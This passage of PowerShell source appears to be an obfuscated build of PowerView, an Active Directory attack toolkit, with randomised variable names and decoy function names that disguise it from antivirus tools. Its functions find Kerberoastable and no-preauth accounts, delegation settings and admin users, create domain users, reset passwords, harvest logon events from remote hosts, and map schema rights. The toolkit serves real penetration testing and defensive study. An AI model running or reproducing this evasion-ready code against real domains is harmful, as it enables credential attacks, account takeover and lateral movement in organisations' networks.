        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $GfUNHdAf99 = @('admincount','accountexpires','badpasswordtime','badpwdcount','cn','codepage','countrycode','description', 'displayname','distinguishedname','dscorepropagationdata','givenname','instancetype','iscriticalsystemobject','lastlogoff','lastlogon','lastlogontimestamp','lockouttime','logoncount','memberof','msds-supportedencryptiontypes','name','objectcategory','objectclass','objectguid','objectsid','primarygroupid','pwdlastset','samaccountname','samaccounttype','sn','useraccountcontrol','userprincipalname','usnchanged','usncreated','whenchanged','whencreated')
        $CAraFHIo99 = @('admincount','cn','description','distinguishedname','dscorepropagationdata','grouptype','instancetype','iscriticalsystemobject','member','memberof','name','objectcategory','objectclass','objectguid','objectsid','samaccountname','samaccounttype','systemflags','usnchanged','usncreated','whenchanged','whencreated')
        $mVfgSRyG99 = @('accountexpires','badpasswordtime','badpwdcount','cn','codepage','countrycode','distinguishedname','dnshostname','dscorepropagationdata','instancetype','iscriticalsystemobject','lastlogoff','lastlogon','lastlogontimestamp','localpolicyflags','logoncount','msds-supportedencryptiontypes','name','objectcategory','objectclass','objectguid','objectsid','operatingsystem','operatingsystemservicepack','operatingsystemversion','primarygroupid','pwdlastset','samaccountname','samaccounttype','serviceprincipalname','useraccountcontrol','usnchanged','usncreated','whenchanged','whencreated')
        $qbMTjYnI99 = @{}
        if ($PSBoundParameters['Domain']) { $qbMTjYnI99['Domain'] = $CmuysoGL99 }
        if ($PSBoundParameters['LDAPFilter']) { $qbMTjYnI99['LDAPFilter'] = $aWyQQagT99 }
        if ($PSBoundParameters['SearchBase']) { $qbMTjYnI99['SearchBase'] = $BffxXlHt99 }
        if ($PSBoundParameters['Server']) { $qbMTjYnI99['Server'] = $vbyFupaI99 }
        if ($PSBoundParameters['SearchScope']) { $qbMTjYnI99['SearchScope'] = $RVZhWaEH99 }
        if ($PSBoundParameters['ResultPageSize']) { $qbMTjYnI99['ResultPageSize'] = $rguZwVJP99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $qbMTjYnI99['ServerTimeLimit'] = $CRJCwXfg99 }
        if ($PSBoundParameters['Tombstone']) { $qbMTjYnI99['Tombstone'] = $iqiYBoee99 }
        if ($PSBoundParameters['Credential']) { $qbMTjYnI99['Credential'] = $QWHERWHL99 }
        if ($PSBoundParameters['Domain']) {
            if ($PSBoundParameters['Credential']) {
                $TWjyaYzC99 = rompers -CmuysoGL99 $CmuysoGL99 | Select-Object -ExpandProperty Forest | Select-Object -ExpandProperty Name
            }
            else {
                $TWjyaYzC99 = rompers -CmuysoGL99 $CmuysoGL99 -QWHERWHL99 $QWHERWHL99 | Select-Object -ExpandProperty Forest | Select-Object -ExpandProperty Name
            }
            Write-Verbose "[poseur] Enumerated forest '$TWjyaYzC99' for target domain '$CmuysoGL99'"
        }
        $SmPArMhL99 = @{}
        if ($PSBoundParameters['Credential']) { $SmPArMhL99['Credential'] = $QWHERWHL99 }
        if ($TWjyaYzC99) {
            $SmPArMhL99['Forest'] = $TWjyaYzC99
        }
    }
    PROCESS {
        if ($PSBoundParameters['ReferencePropertySet']) {
            Write-Verbose "[poseur] Using specified -ChOeCDyK99"
            $iOSlMPhe99 = $ChOeCDyK99
        }
        elseif ($PSBoundParameters['ReferenceObject']) {
            Write-Verbose "[poseur] Extracting property names from -kPdfPxXl99 to use as the reference property set"
            $iOSlMPhe99 = Get-Member -ZdbBtSMI99 $kPdfPxXl99 -MemberType NoteProperty | Select-Object -Expand Name
            $PJLtWbCm99 = $kPdfPxXl99.objectclass | Select-Object -Last 1
            Write-Verbose "[poseur] Calculated ReferenceObjectClass : $PJLtWbCm99"
        }
        else {
            Write-Verbose "[poseur] Using the default reference property set for the object class '$XFGfFgnK99'"
        }
        if (($XFGfFgnK99 -eq 'User') -or ($PJLtWbCm99 -eq 'User')) {
            $SoQlDZmc99 = melodrama @SearcherArguments
            if (-not $iOSlMPhe99) {
                $iOSlMPhe99 = $GfUNHdAf99
            }
        }
        elseif (($XFGfFgnK99 -eq 'Group') -or ($PJLtWbCm99 -eq 'Group')) {
            $SoQlDZmc99 = highfalutin @SearcherArguments
            if (-not $iOSlMPhe99) {
                $iOSlMPhe99 = $CAraFHIo99
            }
        }
        elseif (($XFGfFgnK99 -eq 'Computer') -or ($PJLtWbCm99 -eq 'Computer')) {
            $SoQlDZmc99 = beefsteaks @SearcherArguments
            if (-not $iOSlMPhe99) {
                $iOSlMPhe99 = $mVfgSRyG99
            }
        }
        else {
            throw "[poseur] Invalid class: $XFGfFgnK99"
        }
        ForEach ($Object in $SoQlDZmc99) {
            $jwtVZAQh99 = Get-Member -ZdbBtSMI99 $Object -MemberType NoteProperty | Select-Object -Expand Name
            ForEach($jcjquzOa99 in $jwtVZAQh99) {
                if ($iOSlMPhe99 -NotContains $jcjquzOa99) {
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'SamAccountName' $Object.SamAccountName
                    $Out | Add-Member Noteproperty 'Property' $jcjquzOa99
                    $Out | Add-Member Noteproperty 'Value' $Object.$jcjquzOa99
                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.PropertyOutlier')
                    $Out
                }
            }
        }
    }
}
function melodrama {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.User')]
    [OutputType('PowerView.User.Raw')]
    [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $NADQIykH99,
        [Switch]
        $SPN,
        [Switch]
        $eSSyreAo99,
        [Parameter(ParameterSetName = 'AllowDelegation')]
        [Switch]
        $PCECHRGg99,
        [Parameter(ParameterSetName = 'DisallowDelegation')]
        [Switch]
        $IllqUNPS99,
        [Switch]
        $FFTTXoiE99,
        [Alias('KerberosPreauthNotRequired', 'NoPreauth')]
        [Switch]
        $oGGHfYxR99,
        [ValidateNotNullOrEmpty()]
        [String]
        $CmuysoGL99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $aWyQQagT99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $IzcJvFdA99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $BffxXlHt99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vbyFupaI99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $RVZhWaEH99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $rguZwVJP99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $CRJCwXfg99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $lGQMWbBj99,
        [Switch]
        $iqiYBoee99,
        [Alias('ReturnOne')]
        [Switch]
        $kCjMYGtw99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    DynamicParam {
        $IDXhQhqm99 = [Enum]::GetNames($lzMGacfo99)
        $IDXhQhqm99 = $IDXhQhqm99 | ForEach-Object {$_; "NOT_$_"}
        enchantresses -Name UACFilter -CgJHCaCU99 $IDXhQhqm99 -Type ([array])
    }
    BEGIN {
        $qbMTjYnI99 = @{}
        if ($PSBoundParameters['Domain']) { $qbMTjYnI99['Domain'] = $CmuysoGL99 }
        if ($PSBoundParameters['Properties']) { $qbMTjYnI99['Properties'] = $IzcJvFdA99 }
        if ($PSBoundParameters['SearchBase']) { $qbMTjYnI99['SearchBase'] = $BffxXlHt99 }
        if ($PSBoundParameters['Server']) { $qbMTjYnI99['Server'] = $vbyFupaI99 }
        if ($PSBoundParameters['SearchScope']) { $qbMTjYnI99['SearchScope'] = $RVZhWaEH99 }
        if ($PSBoundParameters['ResultPageSize']) { $qbMTjYnI99['ResultPageSize'] = $rguZwVJP99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $qbMTjYnI99['ServerTimeLimit'] = $CRJCwXfg99 }
        if ($PSBoundParameters['SecurityMasks']) { $qbMTjYnI99['SecurityMasks'] = $lGQMWbBj99 }
        if ($PSBoundParameters['Tombstone']) { $qbMTjYnI99['Tombstone'] = $iqiYBoee99 }
        if ($PSBoundParameters['Credential']) { $qbMTjYnI99['Credential'] = $QWHERWHL99 }
        $PSOgPbQH99 = squintest @SearcherArguments
    }
    PROCESS {
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            enchantresses -GTbnmZHU99 -BoSaCifq99 $PSBoundParameters
        }
        if ($PSOgPbQH99) {
            $UpOHlfOj99 = ''
            $iNUvqNTo99 = ''
            $NADQIykH99 | Where-Object {$_} | ForEach-Object {
                $xzUuDuRm99 = $_.Replace('(', '\28').Replace(')', '\29')
                if ($xzUuDuRm99 -match '^S-1-') {
                    $UpOHlfOj99 += "(objectsid=$xzUuDuRm99)"
                }
                elseif ($xzUuDuRm99 -match '^CN=') {
                    $UpOHlfOj99 += "(distinguishedname=$xzUuDuRm99)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $oXGljrha99 = $xzUuDuRm99.SubString($xzUuDuRm99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[melodrama] Extracted domain '$oXGljrha99' from '$xzUuDuRm99'"
                        $qbMTjYnI99['Domain'] = $oXGljrha99
                        $PSOgPbQH99 = squintest @SearcherArguments
                        if (-not $PSOgPbQH99) {
                            Write-Warning "[melodrama] Unable to retrieve domain searcher for '$oXGljrha99'"
                        }
                    }
                }
                elseif ($xzUuDuRm99 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $PTUZmxXK99 = (([Guid]$xzUuDuRm99).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $UpOHlfOj99 += "(objectguid=$PTUZmxXK99)"
                }
                elseif ($xzUuDuRm99.Contains('\')) {
                    $lCzXByeX99 = $xzUuDuRm99.Replace('\28', '(').Replace('\29', ')') | upbraids -ZMAhChio99 Canonical
                    if ($lCzXByeX99) {
                        $wvZHbMee99 = $lCzXByeX99.SubString(0, $lCzXByeX99.IndexOf('/'))
                        $TEQSWNGN99 = $xzUuDuRm99.Split('\')[1]
                        $UpOHlfOj99 += "(samAccountName=$TEQSWNGN99)"
                        $qbMTjYnI99['Domain'] = $wvZHbMee99
                        Write-Verbose "[melodrama] Extracted domain '$wvZHbMee99' from '$xzUuDuRm99'"
                        $PSOgPbQH99 = squintest @SearcherArguments
                    }
                }
                else {
                    $UpOHlfOj99 += "(samAccountName=$xzUuDuRm99)"
                }
            }
            if ($UpOHlfOj99 -and ($UpOHlfOj99.Trim() -ne '') ) {
                $iNUvqNTo99 += "(|$UpOHlfOj99)"
            }
            if ($PSBoundParameters['SPN']) {
                Write-Verbose '[melodrama] Searching for non-null service principal names'
                $iNUvqNTo99 += '(servicePrincipalName=*)'
            }
            if ($PSBoundParameters['AllowDelegation']) {
                Write-Verbose '[melodrama] Searching for users who can be delegated'
                $iNUvqNTo99 += '(!(userAccountControl:1.2.840.113556.1.4.803:=1048574))'
            }
            if ($PSBoundParameters['DisallowDelegation']) {
                Write-Verbose '[melodrama] Searching for users who are sensitive and not trusted for delegation'
                $iNUvqNTo99 += '(userAccountControl:1.2.840.113556.1.4.803:=1048574)'
            }
            if ($PSBoundParameters['AdminCount']) {
                Write-Verbose '[melodrama] Searching for adminCount=1'
                $iNUvqNTo99 += '(admincount=1)'
            }
            if ($PSBoundParameters['TrustedToAuth']) {
                Write-Verbose '[melodrama] Searching for users that are trusted to authenticate for other principals'
                $iNUvqNTo99 += '(msds-allowedtodelegateto=*)'
            }
            if ($PSBoundParameters['PreauthNotRequired']) {
                Write-Verbose '[melodrama] Searching for user accounts that do not require kerberos preauthenticate'
                $iNUvqNTo99 += '(userAccountControl:1.2.840.113556.1.4.803:=4194304)'
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[melodrama] Using additional LDAP filter: $aWyQQagT99"
                $iNUvqNTo99 += "$aWyQQagT99"
            }
            $LupSsQtq99 | Where-Object {$_} | ForEach-Object {
                if ($_ -match 'NOT_.*') {
                    $jNRpFlgU99 = $_.Substring(4)
                    $IqWhfNmp99 = [Int]($lzMGacfo99::$jNRpFlgU99)
                    $iNUvqNTo99 += "(!(userAccountControl:1.2.840.113556.1.4.803:=$IqWhfNmp99))"
                }
                else {
                    $IqWhfNmp99 = [Int]($lzMGacfo99::$_)
                    $iNUvqNTo99 += "(userAccountControl:1.2.840.113556.1.4.803:=$IqWhfNmp99)"
                }
            }
            $PSOgPbQH99.filter = "(&(samAccountType=805306368)$iNUvqNTo99)"
            Write-Verbose "[melodrama] filter string: $($PSOgPbQH99.filter)"
            if ($PSBoundParameters['FindOne']) { $IUnNdChl99 = $PSOgPbQH99.FindOne() }
            else { $IUnNdChl99 = $PSOgPbQH99.FindAll() }
            $IUnNdChl99 | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    $User = $_
                    $User.PSObject.TypeNames.Insert(0, 'PowerView.User.Raw')
                }
                else {
                    $User = gelling -IzcJvFdA99 $_.Properties
                    $User.PSObject.TypeNames.Insert(0, 'PowerView.User')
                }
                $User
            }
            if ($IUnNdChl99) {
                try { $IUnNdChl99.dispose() }
                catch {
                    Write-Verbose "[melodrama] Error disposing of the Results object: $_"
                }
            }
            $PSOgPbQH99.dispose()
        }
    }
}
function funny {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.UserPrincipal')]
    Param(
        [Parameter(Mandatory = $True)]
        [ValidateLength(0, 256)]
        [String]
        $WCChaSZB99,
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('Password')]
        [Security.SecureString]
        $BYkNgxVj99,
        [ValidateNotNullOrEmpty()]
        [String]
        $Name,
        [ValidateNotNullOrEmpty()]
        [String]
        $qtGJucEj99,
        [ValidateNotNullOrEmpty()]
        [String]
        $AkKSKMRL99,
        [ValidateNotNullOrEmpty()]
        [String]
        $CmuysoGL99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty
    )
    $DoqjNWVs99 = @{
        'Identity' = $WCChaSZB99
    }
    if ($PSBoundParameters['Domain']) { $DoqjNWVs99['Domain'] = $CmuysoGL99 }
    if ($PSBoundParameters['Credential']) { $DoqjNWVs99['Credential'] = $QWHERWHL99 }
    $oJvGZDLA99 = leavening @ContextArguments
    if ($oJvGZDLA99) {
        $User = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList ($oJvGZDLA99.Context)
        $User.SamAccountName = $oJvGZDLA99.Identity
        $EvFGmgdL99 = New-Object System.Management.Automation.PSCredential('a', $BYkNgxVj99)
        $User.SetPassword($EvFGmgdL99.GetNetworkCredential().Password)
        $User.Enabled = $True
        $User.PasswordNotRequired = $False
        if ($PSBoundParameters['Name']) {
            $User.Name = $Name
        }
        else {
            $User.Name = $oJvGZDLA99.Identity
        }
        if ($PSBoundParameters['DisplayName']) {
            $User.DisplayName = $qtGJucEj99
        }
        else {
            $User.DisplayName = $oJvGZDLA99.Identity
        }
        if ($PSBoundParameters['Description']) {
            $User.Description = $AkKSKMRL99
        }
        Write-Verbose "[funny] Attempting to create user '$WCChaSZB99'"
        try {
            $Null = $User.Save()
            Write-Verbose "[funny] User '$WCChaSZB99' successfully created"
            $User
        }
        catch {
            Write-Warning "[funny] Error creating user '$WCChaSZB99' : $_"
        }
    }
}
function suaver {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.UserPrincipal')]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('UserName', 'UserIdentity', 'User')]
        [String]
        $NADQIykH99,
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('Password')]
        [Security.SecureString]
        $BYkNgxVj99,
        [ValidateNotNullOrEmpty()]
        [String]
        $CmuysoGL99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty
    )
    $DoqjNWVs99 = @{ 'Identity' = $NADQIykH99 }
    if ($PSBoundParameters['Domain']) { $DoqjNWVs99['Domain'] = $CmuysoGL99 }
    if ($PSBoundParameters['Credential']) { $DoqjNWVs99['Credential'] = $QWHERWHL99 }
    $oJvGZDLA99 = leavening @ContextArguments
    if ($oJvGZDLA99) {
        $User = [System.DirectoryServices.AccountManagement.UserPrincipal]::FindByIdentity($oJvGZDLA99.Context, $NADQIykH99)
        if ($User) {
            Write-Verbose "[suaver] Attempting to set the password for user '$NADQIykH99'"
            try {
                $EvFGmgdL99 = New-Object System.Management.Automation.PSCredential('a', $BYkNgxVj99)
                $User.SetPassword($EvFGmgdL99.GetNetworkCredential().Password)
                $Null = $User.Save()
                Write-Verbose "[suaver] Password for user '$NADQIykH99' successfully reset"
            }
            catch {
                Write-Warning "[suaver] Error setting password for user '$NADQIykH99' : $_"
            }
        }
        else {
            Write-Warning "[suaver] Unable to find user '$NADQIykH99'"
        }
    }
}
function bungler {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LogonEvent')]
    [OutputType('PowerView.ExplicitCredentialLogonEvent')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('dnshostname', 'HostName', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $iEYVPYCX99 = $Env:COMPUTERNAME,
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $qdTaDskZ99 = [DateTime]::Now.AddDays(-1),
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $feOfVFSp99 = [DateTime]::Now,
        [ValidateRange(1, 1000000)]
        [Int]
        $AVWFCNgx99 = 5000,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $PuOcqgYP99 = @"
<QueryList>
    <Query Id="0" Path="Security">
        <!-- Logon events -->
        <Select Path="Security">
            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and (Level=4 or Level=0) and (EventID=4624)
                    and TimeCreated[
                        @SystemTime&gt;='$($qdTaDskZ99.ToUniversalTime().ToString('s'))' and @SystemTime&lt;='$($feOfVFSp99.ToUniversalTime().ToString('s'))'
                    ]
                ]
            ]
            and
            *[EventData[Data[@Name='TargetUserName'] != 'ANONYMOUS LOGON']]
        </Select>
        <!-- Logon with explicit credential events -->
        <Select Path="Security">
            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and (Level=4 or Level=0) and (EventID=4648)
                    and TimeCreated[
                        @SystemTime&gt;='$($qdTaDskZ99.ToUniversalTime().ToString('s'))' and @SystemTime&lt;='$($feOfVFSp99.ToUniversalTime().ToString('s'))'
                    ]
                ]
            ]
        </Select>
        <Suppress Path="Security">
            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and
                    (Level=4 or Level=0) and (EventID=4624 or EventID=4625 or EventID=4634)
                ]
            ]
            and
            *[
                EventData[
                    (
                        (Data[@Name='LogonType']='5' or Data[@Name='LogonType']='0')
                        or
                        Data[@Name='TargetUserName']='ANONYMOUS LOGON'
                        or
                        Data[@Name='TargetUserSID']='S-1-5-18'
                    )
                ]
            ]
        </Suppress>
    </Query>
</QueryList>
"@
        $XxFOAZgh99 = @{
            'FilterXPath' = $PuOcqgYP99
            'LogName' = 'Security'
            'MaxEvents' = $AVWFCNgx99
        }
        if ($PSBoundParameters['Credential']) { $XxFOAZgh99['Credential'] = $QWHERWHL99 }
    }
    PROCESS {
        ForEach ($UEyZXQpH99 in $iEYVPYCX99) {
            $XxFOAZgh99['ComputerName'] = $UEyZXQpH99
            Get-WinEvent @EventArguments| ForEach-Object {
                $Event = $_
                $IzcJvFdA99 = $Event.Properties
                Switch ($Event.Id) {
                    4624 {
                        if(-not $IzcJvFdA99[5].Value.EndsWith('$')) {
                            $TVkhXGOk99 = New-Object PSObject -Property @{
                                ComputerName              = $UEyZXQpH99
                                TimeCreated               = $Event.TimeCreated
                                EventId                   = $Event.Id
                                SubjectUserSid            = $IzcJvFdA99[0].Value.ToString()
                                SubjectUserName           = $IzcJvFdA99[1].Value
                                SubjectDomainName         = $IzcJvFdA99[2].Value
                                SubjectLogonId            = $IzcJvFdA99[3].Value
                                TargetUserSid             = $IzcJvFdA99[4].Value.ToString()
                                TargetUserName            = $IzcJvFdA99[5].Value
                                TargetDomainName          = $IzcJvFdA99[6].Value
                                TargetLogonId             = $IzcJvFdA99[7].Value
                                LogonType                 = $IzcJvFdA99[8].Value
                                LogonProcessName          = $IzcJvFdA99[9].Value
                                AuthenticationPackageName = $IzcJvFdA99[10].Value
                                WorkstationName           = $IzcJvFdA99[11].Value
                                LogonGuid                 = $IzcJvFdA99[12].Value
                                TransmittedServices       = $IzcJvFdA99[13].Value
                                LmPackageName             = $IzcJvFdA99[14].Value
                                KeyLength                 = $IzcJvFdA99[15].Value
                                ProcessId                 = $IzcJvFdA99[16].Value
                                ProcessName               = $IzcJvFdA99[17].Value
                                IpAddress                 = $IzcJvFdA99[18].Value
                                IpPort                    = $IzcJvFdA99[19].Value
                                ImpersonationLevel        = $IzcJvFdA99[20].Value
                                RestrictedAdminMode       = $IzcJvFdA99[21].Value
                                TargetOutboundUserName    = $IzcJvFdA99[22].Value
                                TargetOutboundDomainName  = $IzcJvFdA99[23].Value
                                VirtualAccount            = $IzcJvFdA99[24].Value
                                TargetLinkedLogonId       = $IzcJvFdA99[25].Value
                                ElevatedToken             = $IzcJvFdA99[26].Value
                            }
                            $TVkhXGOk99.PSObject.TypeNames.Insert(0, 'PowerView.LogonEvent')
                            $TVkhXGOk99
                        }
                    }
                    4648 {
                        if((-not $IzcJvFdA99[5].Value.EndsWith('$')) -and ($IzcJvFdA99[11].Value -match 'taskhost\.exe')) {
                            $TVkhXGOk99 = New-Object PSObject -Property @{
                                ComputerName              = $UEyZXQpH99
                                TimeCreated       = $Event.TimeCreated
                                EventId           = $Event.Id
                                SubjectUserSid    = $IzcJvFdA99[0].Value.ToString()
                                SubjectUserName   = $IzcJvFdA99[1].Value
                                SubjectDomainName = $IzcJvFdA99[2].Value
                                SubjectLogonId    = $IzcJvFdA99[3].Value
                                LogonGuid         = $IzcJvFdA99[4].Value.ToString()
                                TargetUserName    = $IzcJvFdA99[5].Value
                                TargetDomainName  = $IzcJvFdA99[6].Value
                                TargetLogonGuid   = $IzcJvFdA99[7].Value
                                TargetServerName  = $IzcJvFdA99[8].Value
                                TargetInfo        = $IzcJvFdA99[9].Value
                                ProcessId         = $IzcJvFdA99[10].Value
                                ProcessName       = $IzcJvFdA99[11].Value
                                IpAddress         = $IzcJvFdA99[12].Value
                                IpPort            = $IzcJvFdA99[13].Value
                            }
                            $TVkhXGOk99.PSObject.TypeNames.Insert(0, 'PowerView.ExplicitCredentialLogonEvent')
                            $TVkhXGOk99
                        }
                    }
                    default {
                        Write-Warning "No handler exists for event ID: $($Event.Id)"
                    }
                }
            }
        }
    }
}
function discomposes {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $CmuysoGL99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vbyFupaI99,
        [ValidateRange(1, 10000)]
        [Int]
        $rguZwVJP99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $CRJCwXfg99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty
    )
    $GUIDs = @{'00000000-0000-0000-0000-000000000000' = 'All'}
    $qTmRRkWW99 = @{}
    if ($PSBoundParameters['Credential']) { $qTmRRkWW99['Credential'] = $QWHERWHL99 }
    try {
        $AhuvnoKm99 = (hangovers @ForestArguments).schema.name
    }
    catch {
        throw '[discomposes] Error in retrieving forest schema path from hangovers'
    }
    if (-not $AhuvnoKm99) {
        throw '[discomposes] Error in retrieving forest schema path from hangovers'
    }
    $qbMTjYnI99 = @{
        'SearchBase' = $AhuvnoKm99
        'LDAPFilter' = '(schemaIDGUID=*)'
    }
    if ($PSBoundParameters['Domain']) { $qbMTjYnI99['Domain'] = $CmuysoGL99 }
    if ($PSBoundParameters['Server']) { $qbMTjYnI99['Server'] = $vbyFupaI99 }
    if ($PSBoundParameters['ResultPageSize']) { $qbMTjYnI99['ResultPageSize'] = $rguZwVJP99 }
    if ($PSBoundParameters['ServerTimeLimit']) { $qbMTjYnI99['ServerTimeLimit'] = $CRJCwXfg99 }
    if ($PSBoundParameters['Credential']) { $qbMTjYnI99['Credential'] = $QWHERWHL99 }
    $FOhcaRWS99 = squintest @SearcherArguments
    if ($FOhcaRWS99) {
        try {
            $IUnNdChl99 = $FOhcaRWS99.FindAll()
            $IUnNdChl99 | Where-Object {$_} | ForEach-Object {
                $GUIDs[(New-Object Guid (,$_.properties.schemaidguid[0])).Guid] = $_.properties.name[0]
            }
            if ($IUnNdChl99) {
                try { $IUnNdChl99.dispose() }
                catch {
                    Write-Verbose "[discomposes] Error disposing of the Results object: $_"
                }
            }
            $FOhcaRWS99.dispose()
        }
        catch {
            Write-Verbose "[discomposes] Error in building GUID map: $_"
        }
    }
    $qbMTjYnI99['SearchBase'] = $AhuvnoKm99.replace('Schema','Extended-Rights')
    $qbMTjYnI99['LDAPFilter'] = '(objectClass=controlAccessRight)'
    $tnKjUACZ99 = squintest @SearcherArguments
    if ($tnKjUACZ99) {
        try {
            $IUnNdChl99 = $tnKjUACZ99.FindAll()
            $IUnNdChl99 | Where-Object {$_} | ForEach-Object {
                $GUIDs[$_.properties.rightsguid[0].toString()] = $_.properties.name[0]
            }
            if ($IUnNdChl99) {
                try { $IUnNdChl99.dispose() }
                catch {
                    Write-Verbose "[discomposes] Error disposing of the Results object: $_"
                }
            }
            $tnKjUACZ99.dispose()
        }
        catch {
            Write-Verbose "[discomposes] Error in building GUID map: $_"
        }
    }
    $GUIDs
}
function beefsteaks {
    [OutputType('PowerView.Computer')]
    [OutputType('PowerView.Computer.Raw')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('SamAccountName', 'Name', 'DNSHostName')]
        [String[]]
        $NADQIykH99,
        [Switch]
        $vDbTHhCu99,
        [Switch]
        $FFTTXoiE99,
        [Switch]
        $UqOuOtdO99,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePrincipalName')]
        [String]
        $SPN,
        [ValidateNotNullOrEmpty()]
        [String]
        $blbEZMhK99,
        [ValidateNotNullOrEmpty()]
        [String]
        $sXOuralh99,
        [ValidateNotNullOrEmpty()]
        [String]
        $cgKWGcFU99,
        [Switch]
        $Ping,
        [ValidateNotNullOrEmpty()]
        [String]
        $CmuysoGL99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $aWyQQagT99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $IzcJvFdA99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $BffxXlHt99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vbyFupaI99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $RVZhWaEH99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $rguZwVJP99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $CRJCwXfg99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $lGQMWbBj99,
        [Switch]
        $iqiYBoee99,
        [Alias('ReturnOne')]
        [Switch]
        $kCjMYGtw99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    DynamicParam {
        $IDXhQhqm99 = [Enum]::GetNames($lzMGacfo99)
        $IDXhQhqm99 = $IDXhQhqm99 | ForEach-Object {$_; "NOT_$_"}
        enchantresses -Name UACFilter -CgJHCaCU99 $IDXhQhqm99 -Type ([array])
    }
    BEGIN {
        $qbMTjYnI99 = @{}
        if ($PSBoundParameters['Domain']) { $qbMTjYnI99['Domain'] = $CmuysoGL99 }
        if ($PSBoundParameters['Properties']) { $qbMTjYnI99['Properties'] = $IzcJvFdA99 }
        if ($PSBoundParameters['SearchBase']) { $qbMTjYnI99['SearchBase'] = $BffxXlHt99 }
        if ($PSBoundParameters['Server']) { $qbMTjYnI99['Server'] = $vbyFupaI99 }
        if ($PSBoundParameters['SearchScope']) { $qbMTjYnI99['SearchScope'] = $RVZhWaEH99 }
